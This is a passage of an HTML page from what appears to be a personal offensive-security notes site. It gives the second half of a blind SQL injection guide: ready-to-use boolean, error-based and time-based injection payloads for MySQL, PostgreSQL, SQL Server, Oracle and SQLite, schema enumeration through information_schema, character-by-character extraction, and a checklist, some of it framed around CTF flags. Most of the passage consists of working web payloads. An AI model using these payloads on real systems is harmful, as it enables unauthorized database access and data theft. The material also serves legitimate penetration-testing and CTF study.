+<p>After confirming position 1, change the position to 2, then 3. Offsets are 1-indexed in the listed substring functions.</p>
+<p>Final verification:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">)</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;flag{recovered_value}&#39;</span></span></span></code></pre></div><p>Case-insensitive collations can make string equality ambiguous; compare character codes / binary or hex values if case matters.</p>
+<h2 id="5-enumerate-schema-with-the-same-method">5. Enumerate schema with the same method<a class="anchor" href="#5-enumerate-schema-with-the-same-method"></a></h2>
+<p>First answer existence, then count, then read one ordered item:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">EXISTS</span><span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">FROM</span> information_schema<span style="color:#eceff4">.</span>tables <span style="color:#81a1c1;font-weight:bold">WHERE</span> table_schema<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">DATABASE</span><span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">table_name</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;flags&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#81a1c1;font-weight:bold">COUNT</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">*</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">FROM</span> information_schema<span style="color:#eceff4">.</span>tables <span style="color:#81a1c1;font-weight:bold">WHERE</span> table_schema<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">DATABASE</span><span style="color:#eceff4">())</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> ASCII<span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SUBSTRING</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#81a1c1;font-weight:bold">table_name</span> <span style="color:#81a1c1;font-weight:bold">FROM</span> information_schema<span style="color:#eceff4">.</span>tables <span style="color:#81a1c1;font-weight:bold">WHERE</span> table_schema<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">DATABASE</span><span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> <span style="color:#81a1c1;font-weight:bold">table_name</span> <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">OFFSET</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">),</span><span style="color:#b48ead">1</span><span style="color:#eceff4">,</span><span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">109</span></span></span></code></pre></div><p>Those examples are MySQL. Use the catalog and pagination in the <a href="../sqli/#4-does-the-query-return-rows-into-the-response">matching engine guide</a>. Never assume the same table order between unqualified requests.</p>
+<h2 id="6-error-based-routes">6. Error-based routes<a class="anchor" href="#6-error-based-routes"></a></h2>
+<h3 id="detailed-conversion-errors">Detailed conversion errors<a class="anchor" href="#detailed-conversion-errors"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#616e87;font-style:italic">-- PostgreSQL, numeric context
+</span></span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">CAST</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> current_database<span style="color:#eceff4">())</span> <span style="color:#81a1c1;font-weight:bold">AS</span> <span style="color:#81a1c1">integer</span><span style="color:#eceff4">)</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#616e87;font-style:italic">-- SQL Server, numeric context
+</span></span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">CONVERT</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">int</span><span style="color:#eceff4">,</span>DB_NAME<span style="color:#eceff4">())</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span></span></span></code></pre></div><p>If exception text includes the converted value, it is direct disclosure. If only error/no-error changes, make the conversion conditional using engine-specific syntax and treat it as a boolean oracle. PostgreSQL planners can evaluate constant invalid expressions early; a paired test is essential.</p>
+<h3 id="oracle-conditional-error">Oracle conditional error<a class="anchor" href="#oracle-conditional-error"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#81a1c1;font-weight:bold">CASE</span> <span style="color:#81a1c1;font-weight:bold">WHEN</span> <span style="color:#81a1c1;font-weight:bold">LENGTH</span><span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">USER</span><span style="color:#eceff4">)</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">5</span> <span style="color:#81a1c1;font-weight:bold">THEN</span> TO_CHAR<span style="color:#eceff4">(</span><span style="color:#b48ead">1</span><span style="color:#81a1c1">/</span><span style="color:#b48ead">0</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">ELSE</span> <span style="color:#a3be8c">&#39;ok&#39;</span> <span style="color:#81a1c1;font-weight:bold">END</span> <span style="color:#81a1c1;font-weight:bold">FROM</span> dual<span style="color:#eceff4">)</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;ok&#39;</span></span></span></code></pre></div><h3 id="sqlite-conditional-error">SQLite conditional error<a class="anchor" href="#sqlite-conditional-error"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">CASE</span> <span style="color:#81a1c1;font-weight:bold">WHEN</span> <span style="color:#81a1c1;font-weight:bold">length</span><span style="color:#eceff4">(</span>sqlite_version<span style="color:#eceff4">())</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">5</span> <span style="color:#81a1c1;font-weight:bold">THEN</span> <span style="color:#81a1c1;font-weight:bold">abs</span><span style="color:#eceff4">(</span><span style="color:#81a1c1">-</span><span style="color:#b48ead">9223372036854775808</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">ELSE</span> <span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">END</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span></span></span></code></pre></div><p>SQLite division by zero is not a dependable exception. MySQL legacy XML function errors are version-dependent; verify function availability before choosing that route.</p>
+<h2 id="7-time-based-routes">7. Time-based routes<a class="anchor" href="#7-time-based-routes"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Engine</th>
+          <th>Conditional timing pattern</th>
+          <th>Prerequisite</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>MySQL</td>
+          <td><code>1 AND IF(CONDITION,SLEEP(2),0)=0</code></td>
+          <td>Expression executed; beware once-per-row evaluation</td>
+      </tr>
+      <tr>
+          <td>PostgreSQL</td>
+          <td><code>1 AND (SELECT 1 FROM pg_sleep(CASE WHEN CONDITION THEN 2 ELSE 0 END))=1</code></td>
+          <td>Scalar subquery executes</td>
+      </tr>
+      <tr>
+          <td>SQL Server</td>
+          <td><code>1'; IF (CONDITION) WAITFOR DELAY '00:00:02'-- -</code></td>
+          <td>Driver accepts this batch</td>
+      </tr>
+      <tr>
+          <td>SQLite</td>
+          <td>No standard sleep function</td>
+          <td>Prefer boolean/error oracle</td>
+      </tr>
+      <tr>
+          <td>Oracle</td>
+          <td>No general scalar sleep payload here</td>
+          <td>Package grants/context differ; prefer existing oracle</td>
+      </tr>
+  </tbody>
+</table>
+<p>Replace <code>CONDITION</code>, not the whole surrounding request. First test constant true/false with a short delay and a stable baseline. Then insert the extraction predicate.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>baseline, false, true, false, true
+</span></span><span style="display:flex;"><span>compare server response time across several repeats
+</span></span><span style="display:flex;"><span>if transport timeout → unknown, not automatically TRUE</span></span></code></pre></div><p>Timing can be distorted by connection setup, jitter, queued work, caching, and retries. Keep requests sequential for manual calibration. Avoid heavy-query tricks that burden the service when a short sleep or boolean difference is available.</p>
+<h2 id="8-final-checklist">8. Final checklist<a class="anchor" href="#8-final-checklist"></a></h2>
+<ul>
+<li>Correct database, schema, stable row, and scalar result?</li>
+<li>Correct string quote / parenthesis / comment closure?</li>
+<li>Distinguishing NULL, empty string, false, and an exception?</li>
+<li>Stable cookies, CSRF token, route, content type, and no cache masking?</li>
+<li>Recovered length and final full equality both confirmed?</li>
+</ul>
+<p>Reference: <a href="https://portswigger.net/web-security/sql-injection/blind">PortSwigger blind SQLi</a>. Engine-specific official references are linked from each database page.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/sqli-oracle/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>06 · SQLi — Oracle</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/source-disclosure/" class="flex align-center">
+        <span>08 · Source / Backup Leaks</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-establish-the-oracle-before-extracting">1. Establish the oracle before extracting</a></li>
+    <li><a href="#2-pick-the-scalar-expression">2. Pick the scalar expression</a></li>
+    <li><a href="#3-extract-length-first">3. Extract length first</a></li>
+    <li><a href="#4-extract-each-character-manually">4. Extract each character manually</a></li>
+    <li><a href="#5-enumerate-schema-with-the-same-method">5. Enumerate schema with the same method</a></li>
+    <li><a href="#6-error-based-routes">6. Error-based routes</a>
+      <ul>
+        <li><a href="#detailed-conversion-errors">Detailed conversion errors</a></li>
+        <li><a href="#oracle-conditional-error">Oracle conditional error</a></li>
+        <li><a href="#sqlite-conditional-error">SQLite conditional error</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-time-based-routes">7. Time-based routes</a></li>
+    <li><a href="#8-final-checklist">8. Final checklist</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
